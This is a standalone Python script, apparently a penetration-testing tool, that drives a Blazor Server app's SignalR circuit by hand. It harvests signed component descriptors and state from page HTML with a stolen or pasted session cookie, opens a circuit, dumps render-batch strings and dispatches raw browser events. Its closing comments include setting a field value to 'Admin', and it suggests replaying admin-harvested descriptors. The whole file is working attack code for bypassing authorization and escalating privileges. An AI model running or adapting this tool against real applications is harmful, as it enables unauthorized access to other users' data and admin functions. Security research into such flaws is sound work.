#!/usr/bin/env python3

import json, re, sys, time
import requests, msgpack

# ------------------------------- CONFIG --------------------------------
BASE   = "https://target.example.com"
PATH   = "/test"
COOKIE = "PASTE_SESSION_COOKIE_HERE"      # swap this, nothing else
# ----------------------------------------------------------------------

RS = b"\x1e"


# --------------------------- blazorpack framing -------------------------
def varint(n):
    out = bytearray()
    while True:
        b = n & 0x7F
        n >>= 7
        if n:
            out.append(b | 0x80)
        else:
            out.append(b)
            return bytes(out)


def read_varint(buf, i):
    val = shift = 0
    while i < len(buf):
        b = buf[i]
        i += 1
        val |= (b & 0x7F) << shift
        if not b & 0x80:
            return val, i
        shift += 7
    raise ValueError("truncated varint")


def frame(obj):
    p = msgpack.packb(obj, use_bin_type=True)
    return varint(len(p)) + p


def unframe(buf):
    i = 0
    while i < len(buf):
        try:
            ln, j = read_varint(buf, i)
        except ValueError:
            return
        if j + ln > len(buf):
            return                      # fragmented; next poll carries the rest
        yield msgpack.unpackb(buf[j:j + ln], raw=False, strict_map_key=False)
        i = j + ln


def strings(data, minlen=4):
    """Render batches keep their string table as literal UTF-8 -- enough to
    confirm a finding without decoding the diff format."""
    out, cur = [], bytearray()
    for b in data:
        if 0x20 <= b < 0x7F:
            cur.append(b)
        else:
            if len(cur) >= minlen:
                out.append(cur.decode())
            cur = bytearray()
    if len(cur) >= minlen:
        out.append(cur.decode())
    return out


# ------------------------------ recon ----------------------------------
def harvest(base, cookie, path):
    """Pull the DP-signed component descriptors + persisted state from page HTML.
    Descriptors cannot be forged, but a plain GET hands them to you."""
    s = requests.Session()
    s.headers.update({"Cookie": cookie, "User-Agent": "Mozilla/5.0"})
    r = s.get(base.rstrip("/") + path, allow_redirects=False)
    marks = [json.loads(m) for m in re.findall(r"<!--Blazor:(\{.*?\})-->", r.text, re.S)]
    state = re.findall(r"<!--Blazor-Component-State:([A-Za-z0-9+/=]+)-->", r.text)
    print(f"[recon] HTTP {r.status_code}  {len(r.text)} bytes  "
          f"{len(marks)} marker(s)  state={bool(state)}")
    for m in marks:
        print(f"[recon]   {m.get('type')} seq={m.get('sequence')} "
              f"descriptor={str(m.get('descriptor'))[:40]}...")
    if state:
        import base64
        try:
            blob = base64.b64decode(state[0])
            print(f"[recon] persisted state {len(blob)} bytes -> {strings(blob)[:12]}")
        except Exception as e:
            print(f"[recon] state decode failed: {e}")
    return r, marks, state


# ------------------------------ circuit ---------------------------------
class Circuit:
    def __init__(self, base, cookie):
        self.base = base.rstrip("/")
        self.s = requests.Session()
        self.s.headers.update({"Cookie": cookie, "User-Agent": "Mozilla/5.0"})
        self.token = None
        self.circuit_id = None
        self.alive = False
        self.next_id = 1
        self.batches = []

    # ---- transport ----
    def negotiate(self):
        r = self.s.post(f"{self.base}/_blazor/negotiate?negotiateVersion=1")
        r.raise_for_status()
        j = r.json()
        self.token = j.get("connectionToken") or j["connectionId"]
        print(f"[+] token {self.token[:28]}...")
        return j

    def send(self, data):
        r = self.s.post(f"{self.base}/_blazor?id={self.token}", data=data,
                        headers={"Content-Type": "application/octet-stream"})
        if r.status_code not in (200, 202):
            raise RuntimeError(f"send {r.status_code}: {r.text[:200]}")

    def poll(self, timeout=35):
        r = self.s.get(f"{self.base}/_blazor?id={self.token}"
                       f"&_={int(time.time() * 1000)}", timeout=timeout)
        if r.status_code == 204:
            self.alive = False
            return b""
        return r.content

    def handshake(self):
        self.send(json.dumps({"protocol": "blazorpack", "version": 1}).encode() + RS)
        raw = self.poll()
        head, _, rest = raw.partition(RS)
        resp = json.loads(head or b"{}")
        if resp.get("error"):
            raise RuntimeError("handshake rejected: " + resp["error"])
        self.alive = True
        print("[+] handshake ok")
        if rest:
            self.handle(rest)

    # ---- hub calls ----
    def invoke(self, target, *args, blocking=True):
        iid = str(self.next_id); self.next_id += 1
        self.send(frame([1, {}, iid if blocking else None, target, list(args), []]))
        return iid

    def start_circuit(self, uri, descriptors, app_state="", raw_args=None):
        """raw_args: pass your BTP-decoded arg list verbatim if the signature
        differs -- it changed across .NET versions. Yours is authoritative."""
        if raw_args is not None:
            return self.invoke("StartCircuit", *raw_args)
        return self.invoke("StartCircuit", self.base + "/", uri,
                           json.dumps(descriptors), app_state)

    def dispatch_event(self, handler_id, event_name="click",
                       field_value=None, component_id=None, event_args=None):
        desc = {"browserRendererId": 0,
                "eventHandlerId": handler_id,
                "eventName": event_name,
                "eventFieldInfo": ({"componentId": component_id,
                                    "fieldValue": field_value}
                                   if field_value is not None else None)}
        return self.invoke("DispatchBrowserEvent",
                           json.dumps(desc),
                           json.dumps(event_args or {"type": event_name}))

    def navigate(self, uri):
        return self.invoke("OnLocationChanged", uri, None, True, blocking=False)

    # ---- inbound ----
    def handle(self, raw):
        for m in unframe(raw):
            if not isinstance(m, list) or not m:
                continue
            t = m[0]
            if t == 1:
                self.server_call(m[3], m[4] or [])
            elif t == 3:
                kind = m[3] if len(m) > 3 else None
                payload = m[4] if len(m) > 4 else None
                if kind == 1:
                    print(f"[!] hub error (id {m[2]}): {payload}")
                elif isinstance(payload, str) and len(payload) > 40:
                    self.circuit_id = payload
                    print(f"[+] circuitId {payload[:36]}...")
                else:
                    print(f"[ok] completion id={m[2]} {payload}")
            elif t == 7:
                self.alive = False
                print(f"[x] closed: {m[1:]}")

    def server_call(self, target, args):
        if target == "JS.RenderBatch":
            bid = next((a for a in args if isinstance(a, int)), None)
            data = next((a for a in args if isinstance(a, (bytes, bytearray))), b"")
            self.batches.append((bid, bytes(data)))
            print(f"\n=== batch {bid}  {len(data)} bytes ===")
            for s in strings(data):
                print("   ", s)
            if bid is not None:
                self.invoke("OnRenderCompleted", bid, None, blocking=False)

        elif target == "JS.BeginInvokeJS":
            handle, ident = args[0], args[1]
            res = {"Blazor._internal.navigationManager.getBaseURI": self.base + "/",
                   "Blazor._internal.navigationManager.getLocationHref":
                       self.base + PATH}.get(ident)
            self.invoke("EndInvokeJSFromDotNet", handle, True,
                        json.dumps([handle, True, res]), blocking=False)

        elif target in ("JS.AttachComponent", "JS.EndInvokeDotNet",
                        "JS.EndLocationChanging"):
            pass
        else:
            print(f"[s->c] {target} {str(args)[:120]}")

    def pump(self, seconds=15):
        end = time.time() + seconds
        while self.alive and time.time() < end:
            raw = self.poll()
            if raw:
                self.handle(raw)


# ------------------------------- driver ---------------------------------
def run(cookie, label="run"):
    print(f"\n{'=' * 60}\n  {label}\n{'=' * 60}")
    _, marks, _ = harvest(BASE, cookie, PATH)
    if not marks:
        print("[-] no descriptors -- blocked at HTTP level, or not prerendered.\n"
              "    Try an admin-harvested descriptor here to test identity binding.")
        return None
    c = Circuit(BASE, cookie)
    c.negotiate()
    c.handshake()
    c.start_circuit(BASE + PATH, marks)
    c.pump(20)
    return c


if __name__ == "__main__":
    c = run(COOKIE)
    # once a batch shows the table, fire row handlers:
    #   c.dispatch_event(47)                               # click
    #   c.dispatch_event(47, "change", field_value="Admin", component_id=5)
    #   c.pump(10)
